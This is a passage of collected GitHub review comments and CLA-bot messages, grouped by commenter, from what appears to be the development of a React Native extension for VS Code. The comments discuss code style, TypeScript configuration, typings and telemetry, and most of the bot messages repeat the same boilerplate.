    "nisheetjain": "Looks good. :)\n. :+1: cool. I like it.. \n. I have already enabled CLA automation...\n. :+1: \n. :+1: \n. :+1: \n. @digeff can you investigate this?\n. Looks great. please make sure we don't have any instance of \"vscode\" in common code(grep -r vscode ./src/common). for instance I discovered ReactDirManager depends on vscode..\n. :+1: \n. :+1: \n. And by \"it actually works\" you mean with the breakpoints dance right (with live reload)\n. :+1: \n. I agree with @dlebu let's hold on this PR...\n. :+1: \n. :+1: \n. :+1: \n. :+1: \n. do we already need lodash?\n. can we use Q.denodeify instead?\n. why don't we copy this file to ~/.vscode/ instead of generating? (Easier to maintain)\n. I think this piece of code can moved to ReactNativeProjectHelper and can be used by extension.activate as well..\n. why is this not a copy from predefined folder (reactTypings) to .vscode/typings?\n. good point. @dlebu can you add this (assuming you added Launcher.launch)\n. actually I am not sure about vscode disposable. we want synchronous code for process.exit but for vscode.disposable we should find out more\n. why do we need this json file?\n. API name doesn't seem correct?\n. should this be fixed at a lower level( ensureFileWithContents)? if file exists and contents don't match?\n. long term it would make sense to support IDisposables. We can have a Disposable manager (for the debugger process) which takes care of cleaning up.\n. should we use promisy commandexecutor here? and for other spawn cases here?\n. agree, but even with what we have we can potentially say \nprocess.on(\"exit\", () => { DisposablesManager.disposables.forEach(d => d.dispose()))\n. I agree, we shouldn't do irreversible or hard to reverse damage to users who want to just use vscode for intellisense and command palette\n. can we do possiblePaths = [path.resolve(1), path.resolve(2)]\nreturn Q.any(possiblePaths.map(p => fsHelper.exists().then(() => resolve(p).))....\nallows us to quickly add more possible paths if needed? I am not too sure if these 2 paths covers all the bases?\n. can we use utils\\node\\Package for this?\n. Can we use the http server channel to communicate node debug folder? \n. can we wrap this into ensureReactTypings method?\n. shouldn't allowJs and addExcludePaths happen as part of enableSalsa?\n. can we restructure the logic as\nif (!VSCODE_TSJS) {\nshowInformationMessage..\n.then(function(){\nif (yes) { enableSalsa())\n}\n.then(function() {\nensureTypings();\n} else {\nensureTypings()\n}\n. let's remove this?\n. this doesn't seem right? why /Code?\n. prompt is for enabling intellisense. I think we finally settled on allowing people to automatically do this and provide detail instructions if things still don't work (not the other way round). @panarasi thoughts?\n. I am not sure about that. @meenakb comments? \n. good point. I have also removed the \"Extension\" just \"React Native Tools (Preview)\"\n. I like it..\n. makes sense\n. Should the displayName be \"React Native Tools (Preview)\"? @panarasi ?\n. what if the component[0] is ^0.20.0\n. worth know what RN user project was targeting when we failed?\n. other than 'target' we really don't want people to change anything as they will break it. A table with single row didn't make sense.\n. I have not talked about windows anywhere... let's deal with it post v0.1.0-alpha\n. ",
    "joshuaskelton": "To be clear, we aren't packaging these bits. It is just for helping us develop the extension, correct?\n. @panarasi can you take a look?\n. \nNon-transparent screengrab\n\nExtension page mockup\n. \nI like that the icon pops more, but the grey is pretty dark.\n. \nGrid view\n\nExtension page view\n. @panarasi feedback?\n. Thanks for keeping us looped in! :+1: \n. Looks like the change was merged. I'll verify once we get the typescript bits.\n. This was resolve with #115\n. Looks good to me.\n. Doing some quick verification on a VS Code alpha drop we still need to set allowJS: true in the tsconfig.json. Otherwise we get no React Native IntelliSense. All React Native types are any.\nJimmy and I discovered all we need is a jsconfig.json in the project root. It can be just {}.\n. :+1: \n. What version of VS Code are you running?\n. It appears that the other jsx extension you have installed overwrites the colorization provided by VS Code. Try this:\n1. Uninstall the jsx extension by TwentyChung\n2. Change your theme to Monokai\n3. Restart VS Code\n. Did you switch the language to JavaScript React?\nEdit: VS Code 0.10.10 was just released and has improved(or at least more consistent) JSX colorization.\n. Good point. I'll hold on this change for the time being.\n. Looks good! :+1: \n. One question, otherwise looks good. :+1: \n. My RN install failed, as it couldn't find ${workspaceRoot}/node_modules/react-native/package.json\n. :+1: \n. Looks like react-native upgrade fixed my issue.\n. :+1: \n. Looking into how tslint does it's reporting. I'd like to error out at the very end so we can see all the issues present.\n. :+1: \n. :+1: \n. :+1: \n. :+1: \n. What consumes this?\n. Looks good.\n. I want to review the telemetry changes once you merge in master.\n. I think the changes look fine.\n. I think it is in a good state. :+1: \n. This looks good to me.\n. Looks good.\n. Ship it! :+1: \n. Pretty straight-forward change. Looks good to me.\n. Currently the intention is to add them in an always or nothing fashion. The data could be simplified to a list of strings if that is what you are thinking?\n. Can do. I wanted it working first, now I can make it promisey.\nEdit: Done.\n. It's an optional parameter and we don't actually use it. I still think it is useful even if we currently aren't using it. If you feel strongly about it, I would consider removing it.\n. Good suggestion.\n. Done.\n. Fixed.\n. @digeff Yes, it allows the Typescript compiler to compile JavaScript files so we may get intellisense from them. It is part of the original method of lighting up Salsa (and it is still required).\nhttps://github.com/Microsoft/vscode/issues/2218\n. I'll do a merge with master, thanks for the suggestion.\n. Sure thing.\n. Do we want to throw an error?\n. @dlebu Enabling compile JavaScript is completely separate of installing the typings, which is why I have not chained them.\n. Nice simplification. Thanks.\n. :+1: \n. What would you suggest? The configuration setting is allowJs, and the technical side of things is allowing the typescript compiler to process JS for intellisense.\n. We don't I'll remove it.\n. This was a parity thing from vscode-cordova. I'll look into it, and remove it if not necessary.\n. Valid point.\n. No we need a hard restart here. We need to communicate you need to Cmd + Q quit.\n. Typescript doesn't honor access modifiers on static methods/members.\n. Yes. I'm refactoring how we handle the user opting in to enable Salsa. We want to do as much work before the restart so we are ready to go.\n. Yes. The information bar always has a 'Close' button on it.\n. :+1: \n. Looks like I missed indentation?\n. Will do. :+1: \n. Is this still needed? Or is it a compatibility issue with Application Insights?\n. This is the same as vscode-cordova. This is intentional, correct?\n. Thank you for clarifying. :+1: \n. @meenakb I moved the telemetry code into the intellisense helper. Can you give this a look to make sure it is still okay?\n. They are separate because they don't rely on each other, and if one fails the other one does not need to be blocked.\n. Good suggestion.\n. I could certainly use a local variable, which is probably a simpler solution.\n. Only if it isn't first in the promise chain of actions that may require restarts.\n. This extension provides...\n. I don't like the phrase: We use some smart tricks\n. Using IntelliSense\n. ...depends on experimental VS Code and TypeScript features...\n. Make screen shot dark theme?\n. 1. The environment variable VSCODE_TSJS=1 is set to enable Salsa.\n2. typescript@next is installed into the .vscode directory in your user directory.\n3. A settings.json file is created in the .vscode directory with typescript.tsdk pointing to the typescript@next install location.\n4. A tsconfig.json file is created in the project root with allowJs: true to allow TypeScript to process JavaScript files.\n5. Typings for React Native are copied into the .vscode directory.\n. Do we want the Windows path here also?\n. os.platform() is what should be used there. Not sure why it is os.type(). Good catch Meena. :+1: \n. There is no required ordering.\nI only broke them up because I didn't want a failure in configuring the workspace to prevent us from configuring the Typescript installation.\n. You could create an issue and assign it to me. Either way.\n. If I recall correctly, TypeScript doesn't honor access control modifiers on static methods. We should probably just remove them.\nEdit: Apparently we disallow the default access modifier, so public is appropriate?\n. Do we use CommandFailedWithErrorCode? I couldn't find any references.\n. :facepunch: \n. Yes this is the object under test. I don't assume any knowledge of it, so I create it fresh each test.\n. Two of the four use this method. Not sure if it should live in setup.\n. Ha. It might as well be a string. I'll change it.\n. Should the above live in a suiteSetup()? Or does it not really matter?\n. :+1: \n. Wow. That was fast. :smile: \n. Nope. I missed that. Thanks for the catch.\n. Currently it only verifies the copyright on production code. This can be easily changed to all files if that is what needs to be done.\n. Sure, I can update this.\n. Ah, yep. I can correct the assertion here.\n. I don't understand your comment. sender.sendMessage() is the message under test.\n. How so? If the method is a no-op, then you horribly break the promise chain.\nOr are you suggesting verifying the result?\n. Nope. You still break the test.\n. I think the tabs break the markdown. If you look at the rich diff, it's a mess.\n. Nope. Will remove.\n. Why is this a separate method?\n. Hmm. Or putting it on a single look looks fine too. I think having the braces on separate lines made me think that you stubbed out the constructor, but had not implemented it.\nclass Foo {\n    constructor(public bar:string){};\n}\n. Nope. Will remove.\n. Not sure. I just went through and removed any duplicated data points. If we don't think userId is useful, I'll remove it.\n. Removed this code. As Jimmy pointed out, the uniqueId is no longer needed.\n. Will do.\n. Nope.\n. Fixed.\n. No longer used?\n. No longer used?\n. I don't think we should leave stuff half done for future work. Either implement it, or remove it.\nEdit: Spoke with Diego about this offline.\n. Is this intentionally public?\n. That API seems strange/clunky. Is RecordingsHelper a wrapper or a factory? It's not immediately obvious what it actually does.\n. I'm fine with the usage of this feature for simple/trivial constructors:\nclass Person {\n    constructor(public firstName: string, public lastName: string) {}\n}\nBut as soon as we start having logic inside the constructor, I'd prefer us to be explicit. Also I'd strongly argue we should not mix the two.\n```\nclass Foo {\n    constructor(bar: Bar, name: string) {\n        this.name = name;\n    bar.init(this.name);\n    // More logic follows...\n}\n\n}\n```\n. As above, don't mix implicit/explicit member definition.\n. +1\n. ",
    "msftclas": "Hi @digeff, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor. If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @dlebu, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Daniel Lebu). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @MSLaguana, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Jimmy Thomson). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @joshuaskelton, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Joshua Skelton). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @MSLaguana, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Jimmy Thomson). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @meenakb, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Meena Kunnathur Balakrishnan). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @dlebu, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Daniel Lebu). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @digeff, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor. If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @meenakb, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Meena Kunnathur Balakrishnan). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @joshuaskelton, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Joshua Skelton). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @joshuaskelton, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Joshua Skelton). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @digeff, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Diego Geffner). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @MSLaguana, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Jimmy Thomson). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @joshuaskelton, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Joshua Skelton). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @digeff, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Diego Geffner). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @digeff, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Diego Geffner). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @MSLaguana, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Jimmy Thomson). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @meenakb, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Meena Kunnathur Balakrishnan). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @MSLaguana, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Jimmy Thomson). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @digeff, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Diego Geffner). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @digeff, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Diego Geffner). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @MSLaguana, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Jimmy Thomson). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @digeff, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Diego Geffner). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @joshuaskelton, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Joshua Skelton). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @nisheetjain, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Nisheet Jain). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @dlebu, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Daniel Lebu). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @meenakb, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Meena Kunnathur Balakrishnan). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @digeff, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Diego Geffner). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @meenakb, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Meena Kunnathur Balakrishnan). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @meenakb, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Meena Kunnathur Balakrishnan). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @MSLaguana, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Jimmy Thomson). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @digeff, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Diego Geffner). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @joshuaskelton, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Joshua Skelton). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @MSLaguana, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Jimmy Thomson). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @digeff, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Diego Geffner). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @digeff, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Diego Geffner). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @dlebu, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Daniel Lebu). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @guillaumejenkins, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Guillaume Jenkins). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @guillaumejenkins, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Guillaume Jenkins). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @ajwhite, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        This seems like a small (but important) contribution, so no Contribution License Agreement is required at this point. Real humans will now evaluate your PR.\n    \nTTYL, MSBOT;\n. @ajwhite, Thanks for signing the contribution license agreement so quickly! Actual humans will now validate the agreement and then evaluate the PR.\nThanks, MSBOT;\n. Hi @MShamiltonia, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Eric Hamilton). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @patridge, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    You've already signed the contribution license agreement. Thanks!\nWe will now validate the agreement and then real humans will evaluate your PR.\nTTYL, MSBOT;\n. Hi @MShamiltonia, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Eric Hamilton). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @hamiltonia, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        In order for us to evaluate and accept your PR, we ask that you sign a contribution license agreement. It's all electronic and will take just minutes. I promise there's no faxing. https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @hamiltonia, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Eric Hamilton). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @Mokto, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        This seems like a small (but important) contribution, so no Contribution License Agreement is required at this point. Real humans will now evaluate your PR.\n    \nTTYL, MSBOT;\n. Hi @Mokto, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        This seems like a small (but important) contribution, so no Contribution License Agreement is required at this point. Real humans will now evaluate your PR.\n    \nTTYL, MSBOT;\n. Hi @mroswald, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        In order for us to evaluate and accept your PR, we ask that you sign a contribution license agreement. It's all electronic and will take just minutes. I promise there's no faxing. https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. @mroswald, Thanks for signing the contribution license agreement so quickly! Actual humans will now validate the agreement and then evaluate the PR.\nThanks, MSBOT;\n. Hi @mroswald, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        This seems like a small (but important) contribution, so no Contribution License Agreement is required at this point. Real humans will now evaluate your PR.\n    \nTTYL, MSBOT;\n. Hi @mroswald, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        In order for us to evaluate and accept your PR, we ask that you sign a contribution license agreement. It's all electronic and will take just minutes. I promise there's no faxing. https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. @mroswald, Thanks for signing the contribution license agreement so quickly! Actual humans will now validate the agreement and then evaluate the PR.\nThanks, MSBOT;\n. Hi @chrbala, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        This seems like a small (but important) contribution, so no Contribution License Agreement is required at this point. Real humans will now evaluate your PR.\n    \nTTYL, MSBOT;\n. Hi @Andreyco, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        In order for us to evaluate and accept your PR, we ask that you sign a contribution license agreement. It's all electronic and will take just minutes. I promise there's no faxing. https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. @Andreyco, Thanks for signing the contribution license agreement so quickly! Actual humans will now validate the agreement and then evaluate the PR.\nThanks, MSBOT;\n. Hi @mroswald, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    You've already signed the contribution license agreement. Thanks!\nThe agreement was validated by Microsoft and real humans are currently evaluating your PR.\nTTYL, MSBOT;\n. Hi @PatoBeltran, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Patricio Saldivar). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @PatoBeltran, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Patricio Saldivar). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @PatoBeltran, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        It looks like you're a Microsoft contributor (Patricio Saldivar). If you're full-time, we DON'T require a Contribution License Agreement. If you are a vendor, please DO sign the electronic Contribution License Agreement. It will take 2 minutes and there's no faxing! https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. Hi @frogcjn, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        In order for us to evaluate and accept your PR, we ask that you sign a contribution license agreement. It's all electronic and will take just minutes. I promise there's no faxing. https://cla.microsoft.com.\n    \nTTYL, MSBOT;\n. @frogcjn, Thanks for signing the contribution license agreement so quickly! Actual humans will now validate the agreement and then evaluate the PR.\nThanks, MSBOT;\n. Hi @frogcjn, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    You've already signed the contribution license agreement. Thanks!\nThe agreement was validated by Microsoft and real humans are currently evaluating your PR.\nTTYL, MSBOT;\n. Hi @orta, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        This seems like a small (but important) contribution, so no Contribution License Agreement is required at this point. Real humans will now evaluate your PR.\n    \nTTYL, MSBOT;\n. Hi @manoj-nama, I'm your friendly neighborhood Microsoft Pull Request Bot (You can call me MSBOT). Thanks for your contribution!\n    \n        This seems like a small (but important) contribution, so no Contribution License Agreement is required at this point. Real 